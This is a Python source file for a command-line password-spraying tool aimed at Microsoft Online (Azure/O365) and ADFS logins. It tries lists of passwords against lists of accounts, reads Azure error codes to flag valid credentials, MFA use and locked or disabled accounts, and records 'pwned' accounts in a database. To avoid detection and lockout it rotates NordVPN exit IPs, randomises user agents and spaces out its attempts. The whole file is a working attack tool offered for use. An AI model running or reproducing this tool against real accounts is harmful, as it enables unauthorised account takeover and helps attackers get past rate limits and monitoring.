import requests
import argparse
import urllib
import urllib.parse
import time
import datetime
import sys
from nordvpn_switcher import initialize_VPN,terminate_VPN
from utils import configure_logger, make_session, random_time, userlist, passwordlist, targetlist, safe_rotate_vpn, get_public_ip, excptn, init_db, log_event, has_user_password_been_tested, has_user_been_pwned
from requests.packages.urllib3.exceptions import TimeoutError
from requests_ntlm import HttpNtlmAuth

def args_parse():
    description = """
    This script will perform password spraying against Microsoft Online accounts (Azure/O365) or ADFS.
    For MSOL :  The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.
    """

    epilog = """
    EXAMPLE USAGE:
    This command will use the provided userlist and attempt to authenticate to each account with a password of Winter2020.
    python3 VPNspray.py -U users.txt -r 1 5 -p 'Winter2020*' --skip-tested --ignore-success --vpn --vpn-area "France,Germany,Netherlands,United Kingdom" msol
    python3 VPNspray.py -U users.txt -s 3 -p 'Winter2020*' -t https://adfs.example.com --skip-tested --ignore-success --vpn --vpn-area "France" adfs
    """
    parser = argparse.ArgumentParser(description=description, epilog=epilog, formatter_class=argparse.RawDescriptionHelpFormatter)
    pass_group = parser.add_mutually_exclusive_group(required=True)
    user_group = parser.add_mutually_exclusive_group(required=True)
    target_group = parser.add_mutually_exclusive_group(required=False)
    sleep_group = parser.add_mutually_exclusive_group(required=False)
    user_group.add_argument('-U', '--userlist', help="emails list to use, one email per line")
    user_group.add_argument('-u', '--user', help="Single email to test")
    pass_group.add_argument('-p', '--password', help="Single password to test")
    pass_group.add_argument('-P', '--passwordlist', help="Password list to test, one password per line")
    pass_group.add_argument("--userAsPass", action=argparse.BooleanOptionalAction, help="Use username as password")
    sleep_group.add_argument('-s', '--sleep', type=int, help="Throttle the attempts to one attempt every # seconds, can be randomized by passing the value 'random' - default is 0", default=0)
    sleep_group.add_argument('-r', '--random', nargs=2, type=int, metavar=('minimum_sleep', 'maximum_sleep'), help="Randomize the time between each authentication attempt. Please provide minimum and maximum values in seconds")
    target_group.add_argument('-T', '--targetlist', help="Targets list to use, one target per line")
    target_group.add_argument('-t', '--target', help="Target server to authenticate against")
    parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password", default=False)
    parser.add_argument("-f", "--force", action=argparse.BooleanOptionalAction, help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
    parser.add_argument("--vpn", action=argparse.BooleanOptionalAction, help="Use nord vpn to rotate IP")
    parser.add_argument('--skip-tested', action='store_true', help="Skip user:password already tried and logged in the DB")
    parser.add_argument('--ignore-success', action='store_true', help="Skip user already pwned in the DB")
    parser.add_argument("--vpn-area", default="Europe", help="VPN Zone(s) to use (ex: --vpn-area France,Germany,Netherlands,United Kingdom). Défaut: Europe.")
    parser.add_argument('method', choices=['adfs', 'msol'])
    return parser.parse_args()

def msol_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success, userAsPass, force):
    working_creds_counter = 0  # zeroing the counter of working creds before starting to count
    username_counter = 0
    prev_ip = initial_ip
    lockout_counter = 0
    lockout_question = False
    total_attempts = len(usernames) * len(usernames if userAsPass else passwords) * len(targets)

    for target in targets:
        for username in usernames:
            if (userAsPass):
                    passwords = [username.split('@')[0]]
            for password in passwords:  # trying one password against each user, less likely to lockout users
                if ignore_success:
                    try:
                        already = has_user_been_pwned(username)
                    except Exception as e:
                        LOGGER.warning(f"[DB] Error during the user pwned check: {e}")
                        already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
                    if already:
                        LOGGER.info(f"[SKIP] {username} already pwned — skipping.")
                        continue
                    
                if skip_tested:
                    try:
                        already = has_user_password_been_tested(username, password)
                    except Exception as e:
                        LOGGER.warning(f"[DB] Error during the user:password check: {e}")
                        already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
                    if already:
                        LOGGER.info(f"[SKIP] {username}:{password} already tested — skipping.")
                        continue
                
                if vpn and username_counter%15==0:
                    new_ip = safe_rotate_vpn(area, prev_ip=prev_ip, rotate_retries=4)
                    if new_ip:
                        prev_ip = new_ip
                        LOGGER.debug(f"[VPN] Using IP {prev_ip}")
                    else:
                        LOGGER.warning("[VPN] Rotation failed — exiting")
                        sys.exit(1)

                body = {
                    'resource': 'https://graph.windows.net',
                    'client_id': '1b730954-1685-4b74-9bfd-dac224a7b894',
                    'client_info': '1',
                    'grant_type': 'password',
                    'username': username,
                    'password': password,
                    'scope': 'openid',
                }

                headers = {
                    'Accept': 'application/json',
                    'Content-Type': 'application/x-www-form-urlencoded',
                }

                session = make_session(random_ua=True)
                r = session.post(f"{target}/common/oauth2/token", headers=headers, data=body)
                ip = get_public_ip(timeout=5, retries=2)

                if r.status_code == 200:
                    LOGGER.info(f"SUCCESS! {username} : {password}")
                    log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="")
                    working_creds_counter += 1
                else:
                    resp = r.json()
                    error = resp["error_description"]

                    if "AADSTS50126" in error:
                        LOGGER.error(f"ERROR!: Invalid username or password. Username: {username} could exist.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50126")

                    elif "AADSTS50128" in error or "AADSTS50059" in error:
                        LOGGER.error(f"WARNING! Tenant for account {username} doesn't exist. Check the domain to make sure they are using Azure/O365 services.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50128")
                        
                    elif "AADSTS50034" in error:
                        LOGGER.error(f"WARNING! The user {username} doesn't exist.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50034")
                                    
                    elif "AADSTS50079" in error or "AADSTS50076" in error:
                        # Microsoft MFA response
                        LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The response indicates MFA (Microsoft) is in use.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates MFA (Microsoft) is in use.")
                        working_creds_counter += 1
                        
                    elif "AADSTS50158" in error:
                        # Conditional Access response (Based off of limited testing this seems to be the response to DUO MFA)
                        LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The response indicates conditional access (MFA: DUO or other) is in use.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="The response indicates conditional access (MFA: DUO or other) is in use.")
                        working_creds_counter += 1
                        
                    elif "AADSTS50053" in error:
                        # Locked out account or Smart Lockout in place
                        LOGGER.error(f"WARNING! The account {username} appears to be locked.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50053")
                        lockout_counter += 1
                        
                    elif "AADSTS50057" in error:
                        # Disabled account
                        LOGGER.error(f"WARNING! The account {username} appears to be disabled.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="AADSTS50057")
                        
                    elif "AADSTS50055" in error:
                        # User password is expired
                        LOGGER.info(f"SUCCESS! {username} : {password} - NOTE: The user's password is expired.")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="success",  ip=ip, details="AADSTS50055")
                        working_creds_counter += 1
                        
                    else:
                        # Unknown errors
                        LOGGER.error(f"Got an error we haven't seen yet for user {username}")
                        log_event(subject=username, password=password, target="https://graph.windows.net", status="fail",  ip=ip, details="Got an error we haven't seen yet for user.")
                        LOGGER.error(error)
                session.close()

                if random is True:  # let's wait between attempts
                    sleep_time = random_time(min_sleep, max_sleep)
                    time.sleep(float(sleep_time))
                else:
                    time.sleep(float(sleep_time))

                username_counter += 1
                LOGGER.info(f"{username_counter} of {total_attempts} users tested")

                # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
                if not force and lockout_counter == 10 and lockout_question == False:
                    LOGGER.error("WARNING! Multiple Account Lockouts Detected!")
                    LOGGER.info("10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?")
                    yes = {'yes', 'y'}
                    no = {'no', 'n', ''}
                    lockout_question = True
                    choice = "X"
                    while(choice not in no and choice not in yes):
                        choice = input("[Y/N] (default is N): ").lower()

                    if choice in no:
                        LOGGER.info("Cancelling the password spray.")
                        LOGGER.info("NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled.")
                        break

                    # else: continue even though lockout is detected
    LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
    LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))


def adfs_attempts(usernames, passwords, targets, sleep_time, random, min_sleep, max_sleep, vpn, area, initial_ip, skip_tested, ignore_success, userAsPass):
    working_creds_counter = 0  # zeroing the counter of working creds before starting to count
    username_counter = 0
    prev_ip = initial_ip
    total_attempts = len(usernames) * len(usernames if userAsPass else passwords) * len(targets)

    try:
        LOGGER.info("[*] Started running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))
        for target in targets:  # checking each target separately
            for username in usernames:
                if (userAsPass):
                        passwords = [username.split('@')[0]]
                for password in passwords:  # trying one password against each user, less likely to lockout users
                    if ignore_success:
                        try:
                            already = has_user_been_pwned(username)
                        except Exception as e:
                            LOGGER.warning(f"[DB] Error during the user pwned check: {e}")
                            already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
                        if already:
                            LOGGER.info(f"[SKIP] {username} already pwned — skipping.")
                            continue
                    
                    if skip_tested:
                        try:
                            already = has_user_password_been_tested(username, password)
                        except Exception as e:
                            LOGGER.warning(f"[DB] Error during the user:password check: {e}")
                            already = False  # en cas d'erreur, on choisit de ne pas bloquer le flux
                        if already:
                            LOGGER.info(f"[SKIP] {username}:{password} already tested — skipping.")
                            continue  # passe au suivant

                    if vpn and username_counter % 15 == 0:
                        new_ip = safe_rotate_vpn(area, prev_ip=prev_ip, rotate_retries=4)
                        if new_ip:
                            prev_ip = new_ip
                            LOGGER.debug(f"[VPN] Using IP {prev_ip}")
                        else:
                            LOGGER.warning("[VPN] Rotation failed — exiting")
                            sys.exit(1)

                    ip = get_public_ip(timeout=5, retries=2)

                    target_url = "%s/adfs/ls/?client-request-id=&wa=wsignin1.0&wtrealm=urn%%3afederation" \
                                 "%%3aMicrosoftOnline&wctx=cbcxt=&username=%s&mkt=&lc=" % (target, username)
                    post_data = urllib.parse.urlencode({'UserName': username, 'Password': password,
                                                        'AuthMethod': 'FormsAuthentication'}).encode('ascii')
                    session = make_session(random_ua=True)
                    session.auth = (username, password)
                    
                    try:
                        response = session.post(target_url, data=post_data, allow_redirects=False,
                                            headers={'Content-Type': 'application/x-www-form-urlencoded',
                                                     'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9, '
                                                               'image/webp,*/*;q=0.8'})
                        sent_headers = response.request.headers
                        LOGGER.debug(f"Sent headers: {sent_headers}")
                        status_code = response.status_code
                        #  Currently checking only if working or not, need to add more tests in the future

                        if status_code == 302:
                            log_event(subject=username, password=password, target=target, status="success", ip=ip, details="")
                            working_creds_counter += 1
                            LOGGER.info("[+] Seems like the creds are valid: %s :: %s on %s" % (username, password, target))
                        else:
                            log_event(subject=username, password=password, target=target, status="fail", ip=ip, details="")
                            LOGGER.error("[-]Creds failed for: %s" % username)
                        session.close()
                    except requests.exceptions.RequestException as e:
                        LOGGER.warning(f"Request failed for {username}@{target_url}: {e}")
                    
                    if random is True:  # let's wait between attempts
                        sleep_time = random_time(min_sleep, max_sleep)
                        time.sleep(float(sleep_time))
                    else:
                        time.sleep(float(sleep_time))
                    username_counter += 1
                    LOGGER.info(f"{username_counter} of {total_attempts} users tested")

        LOGGER.info("[*] Overall compromised accounts: %s" % working_creds_counter)
        LOGGER.info("[*] Finished running at: %s" % datetime.datetime.now().strftime('%d-%m-%Y %H:%M:%S'))

    except TimeoutError:
        LOGGER.critical("[!] Timeout! check if target is accessible")
        pass

    except KeyboardInterrupt:
        LOGGER.critical("[CTRL+C] Stopping the tool")
        exit(1)

    except Exception as e:
        excptn(e)

def main():
    args = args_parse()
    random = False
    min_sleep, max_sleep = 0, 0
    usernames, passwords, targets = [], [], []
    global LOGGER
    LOGGER = configure_logger(args.verbose, "LOG")
    init_db("events.db")

    if args.userlist:
        try:
            usernames = userlist(args.userlist)
        except Exception as err:
            excptn(err)
    elif args.user:
        try:
            usernames = [args.user]
        except Exception as err:
            excptn(err)
    if args.password:
        try:
            passwords = [args.password]
        except Exception as err:
            excptn(err)
    elif args.passwordlist:
        try:
            passwords = passwordlist(args.passwordlist)
        except Exception as err:
            excptn(err)
        except Exception as err:
            excptn(err)
    if args.target:
            try:
                targets = [args.target]
            except Exception as err:
                excptn(err)
    elif args.targetlist:
        try:
            targets = targetlist(args.targetlist)
        except Exception as err:
            excptn(err)
    elif args.method == 'adfs' and not (args.target or args.targetlist):
        LOGGER.error("ADFS method needs at least one target. Exiting.")
        sys.exit(1)
    elif args.method == 'msol' and not (args.target or args.targetlist):
        targets = ["https://login.microsoft.com"]

    total_accounts = len(usernames)
    total_passwords = len(usernames if args.userAsPass else passwords)
    total_targets = len(targets)
    total_attempts = total_accounts * total_passwords * total_targets
    LOGGER.info("Total number of users to test: %s" % str(total_accounts))
    LOGGER.info("Total number of passwords to test: %s" % str(total_passwords))
    LOGGER.info("Total number of targets to test: %s" % str(total_passwords))
    LOGGER.info("Total number of attempts: %s" % str(total_attempts))
    LOGGER.info(f"Current date and time: {time.ctime()}")

    initial_ip = get_public_ip(timeout=5, retries=2)
    area = args.vpn_area or "Europe"

    if args.vpn:
        try:
            initialize_VPN(save=1, area_input=[area])
            LOGGER.debug(f"[VPN] initialized VPN on: {area} region(s)")
        except Exception as e:
            LOGGER.warning(f"[VPN] initialize_VPN failed at start: {e}")

        # --- NEW: capture initial IP and exit if unavailable ---
        prev_ip = initial_ip
        if not prev_ip:
            LOGGER.critical("[VPN] Could not determine initial public IP after VPN init. Exiting.")
            try:
                terminate_VPN()
            except Exception as e:
                LOGGER.warning(f"[VPN] terminate_VPN failed while exiting: {e}")
            sys.exit(1)
        else:
            LOGGER.info(f"[VPN] Initial public IP: {prev_ip}")

    if args.random:
        random = True
        min_sleep = args.random[0]
        max_sleep = args.random[1]

    if args.method == 'adfs':
        LOGGER.info("Now spraying ADFS.")
        adfs_attempts(usernames, passwords, targets,
                      args.sleep, random, min_sleep, max_sleep, args.vpn, area, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass)
    elif args.method =='msol':
        LOGGER.info("Now spraying Microsoft Online.")
        msol_attempts(usernames, passwords, targets, args.sleep, random, min_sleep, max_sleep, 
                  args.vpn, area, initial_ip, args.skip_tested, args.ignore_success, args.userAsPass, args.force)
    else:
        LOGGER.critical("[!] Please choose a method (autodiscover or adfs)")

    if args.vpn:
        terminate_VPN()

if __name__ == "__main__":
    main()